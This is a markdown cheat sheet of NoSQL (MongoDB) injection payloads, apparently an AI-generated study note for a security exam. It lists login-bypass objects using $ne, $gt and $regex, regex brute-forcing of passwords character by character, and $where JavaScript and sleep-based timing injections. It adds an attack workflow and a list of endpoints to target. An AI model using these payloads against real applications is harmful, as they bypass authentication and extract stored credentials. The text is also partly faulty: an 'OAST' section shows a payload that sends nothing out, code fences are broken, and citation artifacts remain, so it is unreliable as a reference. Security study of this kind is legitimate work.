
---

``md
> [!ABSTRACT]
> NoSQL Injection is a vulnerability where an attacker manipulates **NoSQL database queries** (e.g., MongoDB) by injecting malicious input.  
> 
> It happens when:
> - User input is directly used in JSON/query objects  
> - No proper validation or sanitization  
> - Dynamic query building is used  
> 
> Impact:
> - Authentication bypass  
> - Data extraction/modification  
> - Possible code execution  
> 
> 🧠 Think: “You’re modifying how the database query behaves” :contentReference[oaicite:0]{index=0}

---

## 🧠 NoSQL Injection – Cheat Sheet

---

### 🎯 1. Basic Detection (Login Bypass Test)

> [!CHECK]
> Test if query operators are interpreted  
> Look for login bypass  

```json
{"username":"admin","password":{"$ne":null}}
````

---

### 🧪 2. Authentication Bypass

> [!SUCCESS]  
> Bypass login using MongoDB operators

```json
{"username":{"$ne":null},"password":{"$ne":null}}
```

```json
{"username":"admin","password":{"$ne":"wrong"}}
```

---

### 🧬 3. Boolean Injection

> [!SUCCESS]  
> Force query to always return true

```json
{"username":{"$gt":""},"password":{"$gt":""}}
```

---

### 🧩 4. Regex Injection

> [!SUCCESS]  
> Match all users or brute-force values

```json
{"username":{"$regex":".*"},"password":{"$regex":".*"}}
```

---

### 💥 5. Extract Data (Regex Brute Force)

> [!SUCCESS]  
> Enumerate data character by character

```json
{"username":"admin","password":{"$regex":"^a"}}
```

```json
{"username":"admin","password":{"$regex":"^ab"}}
```

---

### ⚙️ 6. JavaScript Injection (MongoDB)

> [!DANGER]  
> Execute JS inside query (if enabled)

```json
{"$where":"this.password.length > 0"}
```

```json
{"$where":"sleep(5000)"}
```

---

### 🧪 7. Blind Injection (Timing-Based)

> [!CHECK]  
> Detect via response delay

```json
{"$where":"sleep(5000)"}
```

---

### 💣 8. Data Extraction via OAST

> [!SUCCESS]  
> Trigger external request (advanced cases)

```json
{"$where":"this.password.match(/.*/)"}
```

---

### 🧪 9. Parameter Pollution (Array Injection)

> [!ATTENTION]  
> Inject arrays to manipulate logic

```http
username=admin&password[$ne]=null
```

---

### 🔍 10. Real Workflow (Operator Method)

> [!SUCCESS]

1. Test login:
    

```json
{"username":"admin","password":"test"}
```

2. Try bypass:
    

```json
{"username":"admin","password":{"$ne":null}}
```

3. If works → enumerate:
    

```json
{"username":"admin","password":{"$regex":"^a"}}
```

4. Extract full value character by character
    
5. Try advanced:
    

```json
{"$where":"sleep(5000)"}
```

---

### 🧠 11. Where to Test

> [!ABSTRACT]

- Login forms
    
- API endpoints
    
- Search fields
    
- JSON-based requests
    
- Mobile app APIs
    

---

## 🔥 Minimal Payload Set (EXAM USE)

> [!SUCCESS]  
> If you remember nothing else

```bash
{"username":"admin","password":{"$ne":null}}
{"username":{"$ne":null},"password":{"$ne":null}}
{"username":{"$regex":".*"},"password":{"$regex":".*"}}
{"username":"admin","password":{"$regex":"^a"}}
{"$where":"sleep(5000)"}
```

---

## ⚠️ Operator Notes

> [!FAILURE]  
> If nothing happens:
> 
> - Input sanitized
>     
> - Operators blocked
>     
> - Query parameterized
>     

---

> [!ATTENTION]  
> NoSQL injection relies on:
> 
> - JSON query manipulation
>     
> - Operator injection (`$ne`, `$regex`, `$where`)
>     
> 
> No operator execution → no exploit

---

```

---

## 🔥 Why this one is important

- Very common in:
  - **MongoDB + Node.js apps**
  - APIs (JSON-based)
- Harder to detect than SQLi because:
  - No clear syntax errors  
  - Looks like “normal JSON”

---

Just say 🚀
::contentReference[oaicite:1]{index=1}
```